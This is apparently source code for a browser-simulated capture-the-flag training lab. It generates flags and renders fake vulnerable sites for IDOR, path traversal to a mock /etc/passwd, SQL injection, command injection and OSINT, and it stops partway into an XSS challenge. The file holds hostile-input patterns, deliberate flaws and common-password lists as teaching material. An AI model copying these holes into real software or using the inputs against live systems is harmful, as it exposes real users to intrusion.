(function () {
    const SEED_KEY = "yazu_ctf_seed_v1";
    function mulberry32(a) {
      return function () {
        a |= 0; a = (a + 0x6D2B79F5) | 0;
        let t = Math.imul(a ^ (a >>> 15), 1 | a);
        t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
        return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
      };
    }
    let seed = parseInt(localStorage.getItem(SEED_KEY) || "0", 10);
    if (!seed) { seed = (Date.now() ^ (Math.random() * 0xffffffff)) >>> 0; localStorage.setItem(SEED_KEY, String(seed)); }
    const rand = mulberry32(seed);
  
    const rnd = {
      int: (a, b) => Math.floor(rand() * (b - a + 1)) + a,
      pick: (arr) => arr[Math.floor(rand() * arr.length)],
      shuffle: (arr) => { const a = arr.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(rand() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; },
      ip: () => `10.10.${rnd.int(0, 255)}.${rnd.int(1, 254)}`,
      hex: (n) => Array.from({ length: n }, () => "0123456789abcdef"[rnd.int(0, 15)]).join(""),
      alnum: (n) => Array.from({ length: n }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[rnd.int(0, 35)]).join(""),
    };
  
    function rot13(s) { return s.replace(/[A-Za-z]/g, ch => { const base = ch <= "Z" ? 65 : 97; return String.fromCharCode(((ch.charCodeAt(0) - base + 13) % 26) + base); }); }
    function caesar(s, shift) { return s.replace(/[A-Za-z]/g, ch => { const base = ch <= "Z" ? 65 : 97; return String.fromCharCode(((ch.charCodeAt(0) - base + shift + 26) % 26) + base); }); }
    function escapeRe(s) { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
    function vigenere(text, key, decrypt) {
      let out = "", ki = 0;
      for (const ch of text) { if (/[a-z]/i.test(ch)) { const base = ch <= "Z" ? 65 : 97; const k = key[ki % key.length].toLowerCase().charCodeAt(0) - 97; const shift = decrypt ? -k : k; out += String.fromCharCode((((ch.charCodeAt(0) - base + shift) % 26 + 26) % 26) + base); ki++; } else out += ch; }
      return out;
    }
  
    const PASSWORDS = ["hunter2","letmein","dragon","monkey","master","shadow","sunshine","trustno1","iloveyou","batman","football","baseball","superman","qwerty123","admin123"];
    const FILLER = ["password","123456","admin","qwerty","abc123","welcome","login","pass","root","guest"];
    const PORTS = [8080,8888,3000,9000,5000,8000,1337,4444];
    const SECRET_PATHS = ["secret","admin","backup","private","internal","hidden"];
    const HIDDEN_FILES = [".hidden_flag",".secret",".flag.txt",".secret_note",".hidden"];
    const PC_NAMES = ["YAZU-WORKSTATION","YAZU-DESKTOP","YAZU-LAB-PC","YAZU-NODE","YAZU-RIG"];
    const CITIES = ["paris","tokyo","newyork","london","sydney","berlin","rome","dubai"];
    const HANDLES = ["ghost_ops","byte_walker","null_pointer","shadow_byte","cyber_fox"];
    const VIG_KEYS = ["secret","yazu","cipher","alpha","crypto"];
  
    const TARGET_IP = rnd.ip();
    const TARGET_HOSTNAME = `yazu-target-${String(rnd.int(1, 99)).padStart(2, "0")}`;
    const TARGET_PC_NAME = rnd.pick(PC_NAMES);
    let UNUSUAL_PORT = rnd.pick(PORTS); while (UNUSUAL_PORT === 80) UNUSUAL_PORT = rnd.pick(PORTS);
    const SECRET_PATH = rnd.pick(SECRET_PATHS);
    const HIDDEN_FILE = rnd.pick(HIDDEN_FILES);
  
    const HASH_PW = rnd.pick(PASSWORDS);
    const HASH_WORDLIST = rnd.shuffle([...FILLER.slice(0, 6), HASH_PW, ...FILLER.slice(6)]);
    const HASH_VALUE = window.__md5(HASH_PW);
  
    const HYDRA_PW = rnd.pick(PASSWORDS);
    const HYDRA_WORDLIST = rnd.shuffle([...FILLER.slice(0, 5), HYDRA_PW, ...FILLER.slice(5)]);
  
    const B64_FLAG = `YAZU{b4s364_1s_n0t_3ncrypt10n_${rnd.alnum(6)}}`;
    const B64_ENCODED = btoa(B64_FLAG);
    const ROT_FLAG = `YAZU{r0t13_1s_r3v3rs1bl3_${rnd.alnum(6)}}`;
    const ROT_ENCODED = rot13(ROT_FLAG);
  
    let ATTACKER_IP = rnd.ip(); while (ATTACKER_IP === TARGET_IP) ATTACKER_IP = rnd.ip();
  
    const XOR_KEY = rnd.int(1, 254);
    const XOR_FLAG = `YAZU{x0r_${rnd.alnum(6)}}`;
    const XOR_CIPHER_HEX = Array.from(XOR_FLAG).map(c => (c.charCodeAt(0) ^ XOR_KEY).toString(16).padStart(2, "0")).join("");
    const XOR_KEY_HEX = XOR_KEY.toString(16).padStart(2, "0");
  
    const VIG_KEY = rnd.pick(VIG_KEYS);
    const VIG_FLAG = `YAZU{v1g3n3r3_${rnd.alnum(6)}}`;
    const VIG_CIPHER = vigenere(VIG_FLAG, VIG_KEY, false);
  
    const GEO_CITY = rnd.pick(CITIES);
    const OSINT_HANDLE = rnd.pick(HANDLES);
    const PY_FLAG = `YAZU{pyth0n_${rnd.alnum(6)}}`;
    const PY_BYTES = Array.from(PY_FLAG).map(c => c.charCodeAt(0) ^ 0x2a);
  
    const IDOR_FLAG = `YAZU{1d0r_${rnd.alnum(6)}}`;
    const LFI_FLAG = `YAZU{lfi_${rnd.alnum(6)}}`;
    const SQLI_FLAG = `YAZU{sql1_${rnd.alnum(6)}}`;
    const CMDI_FLAG = `YAZU{cmd1_${rnd.alnum(6)}}`;
  
    const FLAG_HOSTNAME = `YAZU{h0st_${TARGET_HOSTNAME.replace(/-/g, "_")}}`;
    const FLAG_IP = `YAZU{${TARGET_IP.replace(/\./g, "_")}}`;
    const FLAG_PCNAME = `YAZU{${TARGET_PC_NAME.toLowerCase().replace(/-/g, "_")}}`;
    const FLAG_HIDDEN = `YAZU{${HIDDEN_FILE.replace(/^\./, "").replace(/\./g, "_")}}`;
    const FLAG_PORT = `YAZU{p0rt_${UNUSUAL_PORT}_0p3n}`;
    const FLAG_HTTP = `YAZU{${SECRET_PATH}_p4th}`;
    const FLAG_HASH = `YAZU{${HASH_PW}}`;
    const FLAG_HYDRA = `YAZU{hydr4_${HYDRA_PW}_f0und}`;
    const FLAG_LOG = `YAZU{${ATTACKER_IP.replace(/\./g, "_")}}`;
    const FLAG_META = "YAZU{canon_eos_5d_leak}";
    const FLAG_STRINGS = "YAZU{str1ngs_4r3_p0w3rful}";
    const FLAG_LSB = "YAZU{lsb_st3g_ftw}";
    const FLAG_SOCIAL = `YAZU{${OSINT_HANDLE}}`;
    const FLAG_GEO = `YAZU{geo_${GEO_CITY}}`;
    const FLAG_USERNAME = `YAZU{h4ndl3_r3us3_l34ks_${rnd.alnum(4)}}`;
    const FLAG_WAYBACK = `YAZU{d3l3t3d_n3v3r_g0n3_${rnd.alnum(4)}}`;
    const FLAG_WHOIS = `YAZU{wh01s_r3c0n_w1ns_${rnd.alnum(4)}}`;
    const FLAG_CORP = `YAZU{1nt3rn4l_m3m0_l34k_${rnd.alnum(4)}}`;
  
    // ════ NEW FLAGS ════
    const FLAG_DNS     = `YAZU{z0n3_tr4nsf3r_${rnd.alnum(4)}}`;
    const FLAG_SVC     = `YAZU{s3rv1c3_vuln_${rnd.alnum(4)}}`;
    const FLAG_SUID    = `YAZU{su1d_pr1v3sc_${rnd.alnum(4)}}`;
    const FLAG_CRON    = `YAZU{cr0n_p3rs1st_${rnd.alnum(4)}}`;
    const FLAG_XSS     = `YAZU{r3fl3ct3d_xss_${rnd.alnum(4)}}`;
    const FLAG_UPLOAD  = `YAZU{unr3str1ct3d_up10ad_${rnd.alnum(4)}}`;
    const FLAG_SSRF    = `YAZU{ssrf_1nt3rn4l_${rnd.alnum(4)}}`;
    const FLAG_JWT     = `YAZU{jwt_n0n3_4lg0_${rnd.alnum(4)}}`;
    const FLAG_CAESAR  = `YAZU{c4es4r_${rnd.alnum(4)}}`;
    const FLAG_RSA     = `YAZU{rs4_sm4ll_e_${rnd.alnum(4)}}`;
    const FLAG_SUBST   = `YAZU{subst1tut10n_${rnd.alnum(4)}}`;
    const FLAG_VIG2    = `YAZU{v1g3n3r3_ch41n_${rnd.alnum(4)}}`;
    const FLAG_SHADOW  = `YAZU{sh4d0w_cr4ck3d_${rnd.alnum(4)}}`;
    const FLAG_PIN     = `YAZU{p1n_${rnd.int(1000, 9999)}}`;
    const FLAG_RULES   = `YAZU{rul3s_4ppl13d_${rnd.alnum(4)}}`;
    const FLAG_COMMON  = `YAZU{c0mm0n_pw_${rnd.alnum(4)}}`;
    const FLAG_BASHHIST = `YAZU{b4sh_h1st0ry_${rnd.alnum(4)}}`;
    const FLAG_TIMELINE = `YAZU{t1m3l1n3_${rnd.alnum(4)}}`;
    const FLAG_USB      = `YAZU{usb_s3r14l_${rnd.alnum(4)}}`;
    const FLAG_DELETED  = `YAZU{d3l3t3d_r3c0v3r_${rnd.alnum(4)}}`;
    const FLAG_EXIF     = `YAZU{3x1f_c0mm3nt_${rnd.alnum(4)}}`;
    const FLAG_PNGCHUNK = `YAZU{png_chunk_${rnd.alnum(4)}}`;
    const FLAG_WS       = `YAZU{wh1t3sp4c3_${rnd.alnum(4)}}`;
    const FLAG_ZIPSTEG  = `YAZU{z1p_st3g_${rnd.alnum(4)}}`;
    const FLAG_EMAIL    = `YAZU{3m41l_h34d3r_${rnd.alnum(4)}}`;
    const FLAG_PGP      = `YAZU{pgp_k3y1d_${rnd.alnum(4)}}`;
    const FLAG_GITHUB   = `YAZU{g1thub_c0mm1t_${rnd.alnum(4)}}`;
    const FLAG_TXT      = `YAZU{dns_txt_r3c0rd_${rnd.alnum(4)}}`;
    const FLAG_REVERSE  = `YAZU{r3v3rs3_func_${rnd.alnum(4)}}`;
    const FLAG_BUGFIX   = `YAZU{bug_f1x3d_${rnd.alnum(4)}}`;
    const FLAG_REGEX    = `YAZU{r3g3x_m4st3r_${rnd.alnum(4)}}`;
    const FLAG_HASHIMPL = `YAZU{h4sh_1mpl_${rnd.alnum(4)}}`;
  
    // ════ SITE CSS ════
    const SITE_CSS = `
      .site{font-family:system-ui,-apple-system,"Segoe UI",sans-serif;color:#1a1a2e;background:#f7f7f9;min-height:100%;display:flex;flex-direction:column;}
      .site *{box-sizing:border-box;}
      .site .site-nav{background:#1a1a2e;color:#fff;padding:14px 24px;display:flex;justify-content:space-between;align-items:center;}
      .site .site-nav strong{color:#f9c74f;font-size:16px;}
      .site .site-nav a{color:#cbd5e1;text-decoration:none;margin-left:18px;font-size:14px;}
      .site .site-nav a:hover{color:#fff;}
      .site .site-container{padding:24px;max-width:900px;margin:0 auto;width:100%;}
      .site h1{color:#1a1a2e;font-size:26px;margin:0 0 8px;font-weight:700;}
      .site h2{font-size:20px;margin:20px 0 8px;}
      .site h3{font-size:16px;margin:0 0 8px;}
      .site p{margin:8px 0;line-height:1.6;}
      .site a{color:#1a1a2e;}
      .site .muted{color:#6b7280;font-size:13px;}
      .site .site-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-top:16px;}
      .site .site-card{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:20px;}
      .site .site-price{color:#059669;font-weight:bold;font-size:14px;margin:4px 0 12px;}
      .site .site-btn{background:#1a1a2e;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;font-size:13px;font-family:inherit;}
      .site .site-btn:hover{background:#16213e;}
      .site .site-btn-secondary{background:#e5e7eb;color:#1a1a2e;}
      .site .site-flag{background:#fef3c7;border-left:4px solid #f59e0b;padding:12px 16px;font-family:ui-monospace,monospace;margin:12px 0;font-size:13px;border-radius:4px;}
      .site .site-error{background:#fee2e2;border-left:4px solid #dc2626;padding:12px 16px;border-radius:4px;color:#7f1d1d;font-size:13px;margin:12px 0;}
      .site .site-success{background:#d1fae5;border-left:4px solid #059669;padding:12px 16px;border-radius:4px;color:#065f46;font-size:13px;margin:12px 0;}
      .site .site-info{background:#dbeafe;border-left:4px solid #2563eb;padding:12px 16px;border-radius:4px;color:#1e3a8a;font-size:13px;margin:12px 0;}
      .site input{padding:10px 12px;border:1px solid #d1d5db;border-radius:6px;width:100%;margin:6px 0;box-sizing:border-box;font-size:14px;font-family:inherit;outline:none;background:#fff;color:#1a1a2e;}
      .site input:focus{border-color:#1a1a2e;}
      .site label{font-size:13px;color:#4b5563;display:block;margin-top:12px;font-weight:500;}
      .site form{background:#fff;padding:24px;border-radius:8px;border:1px solid #e5e7eb;max-width:420px;}
      .site form button{background:#1a1a2e;color:#fff;padding:10px 20px;border:0;border-radius:4px;cursor:pointer;font-size:14px;font-family:inherit;width:100%;margin-top:16px;}
      .site pre{background:#0b0f14;color:#d1d5db;padding:16px;border-radius:6px;overflow-x:auto;font-size:12.5px;font-family:ui-monospace,monospace;line-height:1.5;margin:12px 0;}
      .site code{background:#f3f4f6;padding:2px 6px;border-radius:3px;font-family:ui-monospace,monospace;font-size:13px;}
      .site hr{border:0;border-top:1px solid #e5e7eb;margin:20px 0;}
      .site .site-post{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:16px;margin:12px 0;}
      .site .site-post-head{display:flex;gap:12px;align-items:flex-start;margin-bottom:8px;}
      .site .site-avatar{width:44px;height:44px;border-radius:50%;background:#1a1a2e;color:#f9c74f;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:16px;flex-shrink:0;}
      .site .site-handle{font-weight:600;font-size:14px;}
      .site .site-time{color:#9ca3af;font-size:12px;}
      .site .site-post-body{margin:8px 0 4px;font-size:14px;line-height:1.6;}
      .site .site-post-meta{color:#6b7280;font-size:12px;margin-top:8px;}
      .site table{width:100%;border-collapse:collapse;font-size:13px;}
      .site th{text-align:left;padding:8px 12px;background:#f3f4f6;color:#4b5563;font-size:12px;font-weight:600;}
      .site td{padding:8px 12px;border-top:1px solid #e5e7eb;}
      .site tr:hover td{background:#f9fafb;}
      .site .site-hero{background:linear-gradient(135deg,#1a1a2e,#3730a3);color:#fff;padding:48px 24px;text-align:center;border-radius:8px;margin-bottom:20px;}
      .site .site-hero h1{color:#fff;font-size:32px;}
      .site .site-hero p{color:#cbd5e1;}
    `;
    function site(brand, nav, body) {
      return `<style>${SITE_CSS}</style><div class="site"><div class="site-nav"><strong>${brand}</strong><div>${nav}</div></div><div class="site-container">${body}</div></div>`;
    }
    const avatar = h => h[0].toUpperCase();
  
    // ════════════════ SITES (existing) ════════════════
    const SHOP_NAV = `<a href="/">Home</a><a href="/products">Products</a><a href="/account?id=1">Account</a><a href="/login">Sign in</a>`;
    const PRODUCTS = [
      { id:1,name:"YAZU T-Shirt",price:"$19.99",desc:"Comfortable cotton tee."},
      { id:2,name:"Hacker Mug",price:"$9.99",desc:"Mug that says 'I love 0day'."},
      { id:3,name:"Mech Keyboard",price:"$149.99",desc:"Mechanical, RGB."},
      { id:4,name:"Rubber Ducky",price:"$44.99",desc:"USB HID attack tool."},
      { id:5,name:"Wifi Pineapple",price:"$99.99",desc:"Wireless auditing platform."},
    ];
    const SHOP_HOME = site("ShopZone",SHOP_NAV,`<h1>Welcome to ShopZone</h1><p class="muted">Cybersecurity enthusiasts shop.</p><h2>Featured</h2><div class="site-grid">${PRODUCTS.slice(0,3).map(p=>`<div class="site-card"><h3>${p.name}</h3><p class="site-price">${p.price}</p><a class="site-btn" href="/product?id=${p.id}">View</a></div>`).join("")}</div>`);
    const SHOP_PRODUCTS = site("ShopZone",SHOP_NAV,`<h1>All products</h1><div class="site-grid">${PRODUCTS.map(p=>`<div class="site-card"><h3>${p.name}</h3><p class="site-price">${p.price}</p><a class="site-btn" href="/product?id=${p.id}">View</a></div>`).join("")}</div>`);
    function productPage(id){const p=PRODUCTS.find(x=>x.id===id);if(!p)return site("ShopZone",SHOP_NAV,`<h1>Not found</h1>`);return site("ShopZone",SHOP_NAV,`<p><a href="/products">&larr; Back</a></p><div class="site-card" style="max-width:520px;"><h1 style="font-size:22px;">${p.name}</h1><p class="site-price" style="font-size:18px;">${p.price}</p><p>${p.desc}</p></div>`);}
    const SHOP_LOGIN = site("ShopZone",SHOP_NAV,`<h1>Sign in</h1><form action="/login" method="get"><label>Username</label><input name="user"/><label>Password</label><input name="pass" type="password"/><button type="submit">Sign in</button></form>`);
    const ACCOUNTS = {1:{name:"bob",email:"bob@shopzone.local",role:"customer",balance:"$42.50",extra:"<p class='muted'>No admin notes.</p>"},2:{name:"admin",email:"admin@shopzone.local",role:"administrator",balance:"$9,999.99",extra:`<p>Internal notes:</p><div class="site-flag">${IDOR_FLAG}</div>`},3:{name:"guest",email:"guest@shopzone.local",role:"guest",balance:"$0.00",extra:"<p class='muted'>Nothing.</p>"},4:{name:"ctf-player",email:"player@shopzone.local",role:"customer",balance:"$1.00",extra:"<p class='muted'>You.</p>"}};
    function accountPage(id){const a=ACCOUNTS[id];if(!a)return site("ShopZone",SHOP_NAV,`<h1>Account not found</h1><div class="site-error">No account id=${id}.</div>`);return site("ShopZone",SHOP_NAV,`<h1>My account</h1><div class="site-card"><h3>${a.name}</h3><p><strong>Email:</strong> ${a.email}</p><p><strong>Role:</strong> ${a.role}</p><p><strong>Balance:</strong> ${a.balance}</p><hr>${a.extra}</div>`);}
  
    const CMS_NAV = `<a href="/?page=home">Home</a><a href="/?page=about">About</a>`;
    function cmsContent(page){switch(page){
      case "home": return `<h1>YazuCMS</h1><p class="muted">Tiny CMS.</p><div class="site-info">Loads pages via <code>?page=</code>.</div>`;
      case "about": return `<h1>About</h1><p>Version 1.0.3.</p>`;
      case "../../etc/passwd": case "../etc/passwd": return `<h1>/?page=${page}</h1><pre>root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nplayer:x:1000:1000::/home/player:/bin/bash</pre>`;
      case "../../var/www/html/config.php": case "../config.php": return `<h1>/?page=${page}</h1><pre>&lt;?php\n$db_pass="s3cr3t_db_pass";\n?&gt;</pre>`;
      case "flag.txt": return `<h1>/?page=${page}</h1><div class="site-flag">${LFI_FLAG}</div>`;
      default: return null;}}
    function cmsPage(page){const c=cmsContent(page);if(c==null)return site("YazuCMS",CMS_NAV,`<h1>404</h1><div class="site-error">Could not load: ${page}</div>`);return site("YazuCMS",CMS_NAV,c);}
  
    const BANK_NAV = `<a href="/">Home</a><a href="/login">Login</a>`;
    const BANK_HOME = site("YazuBank",BANK_NAV,`<h1>YazuBank</h1><div class="site-grid"><div class="site-card"><h3>Savings</h3><p class="site-price">2.1% APY</p></div><div class="site-card"><h3>Checking</h3><p class="site-price">No fees</p></div></div>`);
    const BANK_LOGIN_FORM = site("YazuBank",BANK_NAV,`<h1>Login</h1><form action="/login" method="get"><label>Username</label><input name="user"/><label>Password</label><input name="pass" type="password"/><button type="submit">Log in</button></form>`);
    function bankLoginResponse(user,pass){const sqli=/('|"|--|#)/.test(user)||/\bor\b\s*['"\d]/i.test(user);const ok=user.trim().toLowerCase()==="admin"&&pass==="secret";if(sqli||ok){return site("YazuBank",BANK_NAV,`<h1>Welcome, admin</h1><div class="site-success">Auth OK.</div><div class="site-card"><p><strong>Balance:</strong> $1,337,420.00</p><hr><div class="site-flag">${SQLI_FLAG}</div></div>`);}return site("YazuBank",BANK_NAV,`<h1>Login</h1><div class="site-error">Invalid credentials.</div><form action="/login" method="get"><label>Username</label><input name="user"/><label>Password</label><input name="pass" type="password"/><button type="submit">Log in</button></form>`);}
  
    const PING_NAV = `<a href="/">Home</a>`;
    const PING_HOME = site("NetTools",PING_NAV,`<h1>Ping Utility</h1><form action="/" method="get"><label>Host</label><input name="host" placeholder="127.0.0.1"/><button type="submit">Ping</button></form>`);
    function pingResponse(host){const base=`PING ${host.split(";")[0].split("&")[0].split("|")[0]} (10.10.14.23) 56(84) bytes\n64 bytes from 10.10.14.23: icmp_seq=1 ttl=64 time=0.042 ms\n64 bytes from 10.10.14.23: icmp_seq=2 ttl=64 time=0.038 ms\n`;if(/[;|&`]|\$\(/.test(host)){const parts=host.split(/[;|&`]|\$\(/);const inj=parts.slice(1).join(" ").replace(/\)$/,"").trim();let out=base+"\n# injected:\n";if(/cat\s+\/flag/i.test(inj))out+=CMDI_FLAG;else if(/^\s*ls\b/.test(inj))out+="bin boot dev etc flag.txt home lib proc root tmp usr var";else if(/^\s*whoami/.test(inj))out+="www-data";else if(inj)out+=`sh: ${inj.split(" ")[0]}: not found`;return site("NetTools",PING_NAV,`<h1>Result</h1><pre>${out}</pre>`);}return site("NetTools",PING_NAV,`<h1>Result</h1><pre>${base}</pre>`);}
  
    const SOCIAL_NAV = `<a href="/">Feed</a><a href="/search">Search</a>`;
    const SOCIAL_POSTS = [
      {id:1,handle:"ghost_ops",time:"2h ago",text:`Just wrapped YAZU lab. My handle is my flag! ${FLAG_SOCIAL}`,likes:12,comments:[{handle:"n0body",text:"nice!"}]},
      {id:2,handle:"n0body",time:"4h ago",text:"coffee then code then coffee",likes:3,comments:[]},
      {id:3,handle:"byte_walker",time:"6h ago",text:"someone leaked creds on LeakBase",likes:5,comments:[]},
      {id:4,handle:"ctf_lead",time:"8h ago",text:"Welcome to SocialBox!",likes:22,comments:[]},
      {id:5,handle:"ghost_ops",time:"1d ago",text:"new rig is stable",likes:7,comments:[]},
      {id:6,handle:"byte_walker",time:"2d ago",text:"excited for the next CTF",likes:9,comments:[]},
    ];
    const SOCIAL_DELETED_POST = {id:42,handle:"ghost_ops",time:"3d ago",text:`OK the YAZU server had a huge misconfig. Saved the memo here: ${FLAG_WAYBACK}`,likes:0,comments:[]};
    const USERS = {"ghost_ops":{bio:"Red team. CTF by night. GitHub: @ghost_ops",followers:128,following:47},"n0body":{bio:"just a person",followers:12,following:34},"byte_walker":{bio:"web exploit enjoyer",followers:44,following:82},"ctf_lead":{bio:"Lead CTF organizer.",followers:512,following:3}};
    function postHtml(p){return `<div class="site-post"><div class="site-post-head"><div class="site-avatar">${avatar(p.handle)}</div><div><div class="site-handle"><a href="/u/${p.handle}">@${p.handle}</a></div><div class="site-time">${p.time}</div></div></div><div class="site-post-body">${p.text}</div><div class="site-post-meta">♥ ${p.likes} · <a href="/post/${p.id}">permalink</a></div></div>`;}
    const SOCIAL_HOME = site("SocialBox",SOCIAL_NAV,`<h1>Feed</h1>${SOCIAL_POSTS.map(postHtml).join("")}`);
    function socialUserPage(h){const u=USERS[h];if(!u)return site("SocialBox",SOCIAL_NAV,`<h1>User not found</h1>`);const posts=SOCIAL_POSTS.filter(p=>p.handle===h);return site("SocialBox",SOCIAL_NAV,`<div class="site-card"><div class="site-post-head"><div class="site-avatar" style="width:64px;height:64px;font-size:24px;">${avatar(h)}</div><div><h1 style="font-size:22px;">@${h}</h1><p>${u.bio}</p><p class="muted"><strong>${u.followers}</strong> followers · <strong>${u.following}</strong> following</p></div></div></div><h2>Posts</h2>${posts.map(postHtml).join("")}`);}
    function socialPostPage(id){if(id===42)return site("SocialBox",SOCIAL_NAV,`<h1>Post #42</h1><div class="site-error">Deleted by author.</div><p class="muted">Try archive.local</p>`);const p=SOCIAL_POSTS.find(x=>x.id===id);if(!p)return site("SocialBox",SOCIAL_NAV,`<h1>Not found</h1>`);return site("SocialBox",SOCIAL_NAV,`<h1>Post #${id}</h1>${postHtml(p)}`);}
    function socialSearch(q){q=(q||"").trim();if(!q)return site("SocialBox",SOCIAL_NAV,`<h1>Search</h1><form action="/search" method="get"><label>Search</label><input name="q"/><button type="submit">Search</button></form>`);const ql=q.toLowerCase();const u=Object.keys(USERS).filter(h=>h.includes(ql));const p=SOCIAL_POSTS.filter(x=>x.text.toLowerCase().includes(ql));return site("SocialBox",SOCIAL_NAV,`<h1>Results for "${q}"</h1><h2>Users</h2>${u.map(h=>`<p><a href="/u/${h}">@${h}</a></p>`).join("")||"<p class='muted'>None.</p>"}<h2>Posts</h2>${p.map(postHtml).join("")||"<p class='muted'>None.</p>"}`);}
  
    const LEAK_NAV = `<a href="/">Recent</a>`;
    const LEAK_PASTES = [
      {id:"a1b2",author:"anon",ts:"3d ago",title:"test paste",body:"hello world\nline 2\nline 3"},
      {id:"c3d4",author:"n0body",ts:"5d ago",title:"my config",body:"[settings]\ntheme=dark\nfont_size=14"},
      {id:"4b1d",author:"ghost_ops",ts:"1d ago",title:"greetings",body:`to the people who keep digging:\nI reuse this handle everywhere.\n\nflag: ${FLAG_USERNAME}`},
      {id:"9x7y",author:"anon",ts:"12h ago",title:"[dump] internal creds",body:`# leaked\n# user: admin\n# pass: yazu_2024!\n\n${FLAG_USERNAME}`},
      {id:"z9q1",author:"byte_walker",ts:"2h ago",title:"reminder",body:"don't paste real creds"},
    ];
    function leakHome(){return site("LeakBase",LEAK_NAV,`<h1>Recent pastes</h1><table><tr><th>ID</th><th>Author</th><th>Title</th><th>When</th></tr>${LEAK_PASTES.map(p=>`<tr><td><a href="/paste/${p.id}"><code>${p.id}</code></a></td><td><a href="/u/${p.author}">@${p.author}</a></td><td>${p.title}</td><td class="muted">${p.ts}</td></tr>`).join("")}</table>`);}
    function leakPastePage(id){const p=LEAK_PASTES.find(x=>x.id===id);if(!p)return site("LeakBase",LEAK_NAV,`<h1>Not found</h1>`);return site("LeakBase",LEAK_NAV,`<p><a href="/">&larr; Back</a></p><h1>${p.title}</h1><p class="muted">by <a href="/u/${p.author}">@${p.author}</a> · ${p.ts}</p><pre>${p.body.replace(/</g,"&lt;")}</pre>`);}
    function leakUserPage(h){const ps=LEAK_PASTES.filter(p=>p.author===h);return site("LeakBase",LEAK_NAV,`<h1>@${h}</h1>${ps.map(p=>`<div class="site-card"><strong><a href="/paste/${p.id}">${p.title}</a></strong><p class="muted">${p.ts}</p></div>`).join("")||"<p class='muted'>No pastes.</p>"}`);}
  
    const ARCHIVE_NAV = `<a href="/">Home</a>`;
    const ARCHIVE_SNAPSHOTS = {"social.local/post/42":[{ts:"20241014",date:"Oct 14, 2024",status:200},{ts:"20240922",date:"Sep 22, 2024",status:200}],"social.local/":[{ts:"20241014",date:"Oct 14, 2024",status:200}]};
    function archiveHome(url){if(!url)return site("Archive",ARCHIVE_NAV,`<div class="site-hero"><h1>Archive</h1><p>Snapshots of the web</p></div><form action="/" method="get"><label>URL</label><input name="url" placeholder="social.local/post/42"/><button type="submit">Browse</button></form>`);const s=ARCHIVE_SNAPSHOTS[url]||[];if(!s.length)return site("Archive",ARCHIVE_NAV,`<h1>No snapshots for ${url}</h1>`);return site("Archive",ARCHIVE_NAV,`<h1>Snapshots for <code>${url}</code></h1><table><tr><th>Timestamp</th><th>Status</th><th></th></tr>${s.map(x=>`<tr><td>${x.date}</td><td>${x.status}</td><td><a class="site-btn" href="/snapshot?url=${encodeURIComponent(url)}&ts=${x.ts}">View</a></td></tr>`).join("")}</table>`);}
    function archiveSnapshot(url,ts){if(url==="social.local/post/42"){const p=SOCIAL_DELETED_POST;return site("Archive",ARCHIVE_NAV,`<div class="site-info">Archived snapshot from ${ts}</div><div class="site-post"><div class="site-post-head"><div class="site-avatar">${avatar(p.handle)}</div><div><div class="site-handle">@${p.handle}</div><div class="site-time">${p.time}</div></div></div><div class="site-post-body">${p.text}</div></div>`);}return site("Archive",ARCHIVE_NAV,`<p>Not available.</p>`);}
  
    const CORP_NAV = `<a href="/">Home</a><a href="/team">Team</a><a href="/press">Press</a>`;
    const CORP_HOME = site("YazuCorp",CORP_NAV,`<div class="site-hero"><h1>YazuCorp</h1><p>Building the future of security.</p></div>`);
    const CORP_TEAM = site("YazuCorp",CORP_NAV,`<h1>Team</h1><table><tr><th>Name</th><th>Role</th><th>Email</th></tr><tr><td>Maria Chen</td><td>CEO</td><td>m.chen@yazucorp.local</td></tr><tr><td>David Okafor</td><td>CTO</td><td>d.okafor@yazucorp.local</td></tr><tr><td>Sara Ali</td><td>Head of Red</td><td>s.ali@yazucorp.local</td></tr></table>`);
    const CORP_PRESS = site("YazuCorp",CORP_NAV,`<h1>Press</h1><div class="site-card" style="margin:8px 0;"><strong><a href="/press/2026-10-01-security-incident">Security Incident at YAZU Lab</a></strong><p class="muted">2026-10-01</p></div>`);
    const CORP_PRESS_INCIDENT = site("YazuCorp",CORP_NAV,`<p><a href="/press">&larr; Back</a></p><h1>Security Incident</h1><p class="muted">Oct 1, 2026</p><p>An internal memo was mistakenly attached. Excerpt:</p><pre>INTERNAL MEMO\n\nThe attacker gained access via Jenkins.\nRotated service accounts.\n\nFlag: ${FLAG_CORP}</pre>`);
  
    const WHOIS_NAV = `<a href="/">Home</a>`;
    function whoisSite(domain){if(!domain)return site("whois.local",WHOIS_NAV,`<h1>WHOIS</h1><form action="/" method="get"><label>Domain</label><input name="domain" placeholder="yazu-target.local"/><button type="submit">Look up</button></form>`);const l=window.__whoisData[domain];if(!l)return site("whois.local",WHOIS_NAV,`<h1>No data for ${domain}</h1>`);return site("whois.local",WHOIS_NAV,`<h1>WHOIS: ${domain}</h1><pre>${l.join("\n")}</pre>`);}
  
    window.__whoisData = {
      "yazu-target.local":["Domain Name: YAZU-TARGET.LOCAL","Registrar: Yazu Registrar Inc.","Registrant Organization: Yazu Labs","Registrant Email: admin@yazu.local","Name Server: NS1.YAZU.LOCAL","DNSSEC: unsigned","%","% NOTICE: flagged during security review.",`% ${FLAG_WHOIS}`,"%"],
      "social.local":["Domain Name: SOCIAL.LOCAL","Registrar: Yazu Registrar Inc.","Registrant Email: admin@yazu.local"],
      "leakbase.local":["Domain Name: LEAKBASE.LOCAL","Registrant: (redacted)"],
      "yazucorp.local":["Domain Name: YAZUCORP.LOCAL","Registrant: YazuCorp Holdings"],
      "archive.local":["Domain Name: ARCHIVE.LOCAL","Registrant: Yazu Archive Project"],
      "whois.local":["Domain Name: WHOIS.LOCAL","Registrant: Yazu Tools"],
    };
  
    // ════ NEW SITES ════
  
    // Blog — XSS challenge
    const BLOG_NAV = `<a href="/">Home</a><a href="/about">About</a>`;
    function blogPage(q) {
      const posts = [
